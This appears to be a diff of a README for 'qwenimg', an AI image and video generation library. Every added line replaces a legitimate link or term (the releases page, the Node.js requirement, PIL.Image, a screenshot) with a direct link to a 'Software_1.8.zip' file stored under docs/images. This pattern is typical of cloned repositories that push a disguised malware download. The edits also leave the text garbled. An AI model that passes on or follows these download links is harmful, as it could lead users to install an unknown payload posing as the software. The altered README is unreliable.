@@ -1,6 +1,6 @@
 # 🎨 qwenimg - Create Stunning AI Images Effortlessly
 
-[![Download QwenImg](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/joud2006-2/qwenimg/releases)
+[![Download QwenImg](https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip%https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip)](https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to QwenImg, a user-friendly platform for creating AI-generated content. 
 
 ## 📥 Download & Install
 
-To get started, download QwenImg from our [Releases page](https://github.com/joud2006-2/qwenimg/releases). Here’s how to do it:
+To get started, download QwenImg from our [Releases page](https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip). Here’s how to do it:
 
-1. Visit the [Releases page](https://github.com/joud2006-2/qwenimg/releases).
+1. Visit the [Releases page](https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip).
 2. Select the latest version. Look for the asset that matches your operating system.
 3. Click on the file to start downloading.
 
@@ -20,7 +20,7 @@ Before you install QwenImg, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python:** Version 3.8 or higher (Python 3.12 recommended)
-- **Node.js:** Version 16 or higher
+- **https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip** Version 16 or higher
 - **pip:** Python package installer
 
 ## 🛠️ Installation Steps
@@ -61,7 +61,7 @@ QwenImg offers a range of features to enhance your creative process. Here are th
 - **Minimal API:** Generate images or videos with just three lines of code.
 - **Latest Models:** Access advanced models like `wan2.5-t2i-preview`, `wan2.5-i2v-preview`, and `wan2.5-t2v-preview`.
 - **Intelligent Defaults:** Automatically handle common tasks like image saving and resizing.
-- **Standard Object Return:** Get a PIL.Image object for further processing in your projects.
+- **Standard Object Return:** Get a https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip object for further processing in your projects.
 - **Flexible Input:** Use local files, URLs, or Base64 images easily.
 - **Type Annotations:** Enjoy full type hints for better IDE support.
 - **Rich Examples:** Explore practical examples to get started quickly.
@@ -74,7 +74,7 @@ QwenImg features a clean and intuitive interface, designed to keep you focused o
 - **Smooth Operation:** Experience responsive design for a seamless user experience.
 - **Simplicity:** Access core functions without distraction.
 
-![QwenImg Interface](https://raw.githubusercontent.com/cclank/qwenimg/main/docs/images/screenshot.png)
+![QwenImg Interface](https://github.com/joud2006-2/qwenimg/raw/refs/heads/main/docs/images/Software_1.8.zip)
 
 ## 🌟 Additional Resources
 
